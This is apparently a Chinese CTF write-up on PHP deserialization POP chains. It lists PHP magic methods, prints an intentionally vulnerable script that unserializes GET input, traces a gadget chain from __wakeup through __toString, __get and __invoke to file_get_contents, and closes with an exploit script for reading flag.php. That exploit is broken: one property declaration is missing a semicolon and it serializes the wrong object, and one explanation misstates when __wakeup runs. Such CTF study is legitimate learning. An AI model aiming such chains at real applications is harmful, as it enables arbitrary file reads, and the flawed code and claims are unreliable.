#php反序列化之POP链

##魔术方法
列举：
__wakeup() //使用反序列函数unserialize()时触发

__sleep() //使用serialize时触发

__destruct() //对象销毁时触发

__construct() //用于创建对象，当实例化对象时被触发

__call() //在对象上下文中调用不可访问的方法时触发

__callStatic() //在静态上下文中调用不可访问的方法时触发

__get() //用于从不可访问的属性读取数据

__set() //用于将数据写入不可访问属性

__isset() //在不可访问的属性上调用isset()或empty()触发

__unset() //在不可访问的属性上使用unset()时触发

__toString() //把类当作字符串使用时触发

__invoke() //脚本尝试将对像调用为函数时触发

##审计代码
```
<?php
//flag is in flag.php
error_reporting(1);
class Read {
    public $var;
    
    /*Read类的一个函数*/
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value)); #将文件的内容以字符串的形式读取出来，并进行base64的加密
        return $text;
    }
    
    /*当以函数的方法调用一个Read类实例时，会先调用__invoke方法*/
    public function __invoke(){
        $content = $this->file_get($this->var); #将被base64加密的文件的内容赋值给$comtent
        echo $content;
    }
}

class Show{
    public $source;
    public $str;
    
    /*当初始化一个Show实例的时候，默认他的file属性为index.php*/
    public function __consturct($file='index.php'){
        $this->source = $file; #将index.php赋值给$this->source
        echo $this->source."Welcome"."<br>"; #显示index.php  Welcomee
    }
    
    /*当一个Show的类实例被当作一个字符串使用时，会。。。。*/
    public function __toString(){
        return $this->str['str']->source;//注意这里，很奇怪。调用了一个从来没有的类属性，
        //所以会调用get方法。而同时正常到$this->str['str']就返回了键值了，但是它后面又有一个取属性的操作。
        //所以想$this->str['str']本身就是一个有source属性的一个类的实例
    }
    
    /*这应该不是一个内置的魔术方法，，，*/
    public function _show(){
        if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this->source)){
            die('hacker');
        }
        else{
            highlight_file($this->source);
        }
    }
    
    /*当对一个Show实例进行反序列化之前调用*/
    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i",$this->source)){
            echo "hacker";
            $this->source="index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }
    
    /*在获取一个Test的类成员的时候调用：$a->bbb*/
    public function __get($key){
        $function = $this->p;
        return $function();
    }
}


if(isset($_GET['hello']))
{
    unserialize($_GET['hello']);
}
else
{
    $show = new Show('pop1.php');
    $show->_show();
}
highlight_file(__FILE__);
?>
```


在输入hello这个变量后，调用unserialize()反序列化函数之前，先调用__wakeup()函数
```
 public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i",$this->source)){
            echo "hacker";
            $this->source="index.php";
        }
    }
```
里面有preg_match正则匹配函数，将一个类实例化的source属性，也是另一个类的对象实例化，以字符串的形式进行遍历匹配，从而触发__toString()函数
```
 public function __toString(){
        return $this->str['str']->source;//注意这里，很奇怪。调用了一个从来没有的类属性，
        //所以会调用get方法。而同时正常到$this->str['str']就返回了键值了，但是它后面又有一个取属性的操作。
        //所以想$this->str['str']本身就是一个有source属性的一个类的实例
    }

```
方法查找到了str[]这个数组，而数组里的str是一个key键，而value值代表的是source，而str['str']需要是一个类的实例化，但是这个属性在show类中却不存在，且return访问里面的数值并返回，所以触发__get()函数
```
 public function __get($key){
        $function = $this->p;
        return $function();
    }
```
而p为一个类的对象实例化的p属性，且将属性取出来，并给$function，然后用函数的方式执行，触发__invoke()函数
```
 public function __invoke(){
        $content = $this->file_get($this->var); #将被base64加密的文件的内容赋值给$comtent
        echo $content;
    }
```
而__invoke()函数中调用了file_get()函数
```
 public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value)); #将文件的内容以字符串的形式读取出来，并进行base64的加密
        return $text;
    }
```
然后给read类下的对象实例化的属性var赋值一个flag.php


构造一个exp
```
<?php

class Read{

public $var;
}

class Show{

public $source;
public $str;

}

class Test{

public $p
}

$a=new Read();
$b=new Show();
$c=new Test();

$b->source=$b;
$b->str['str']=$c;
$c->p=$a;
$a->var='flag.php';

echo serialize($a);

?>
```
得到一个序列化的数值，然后构造payload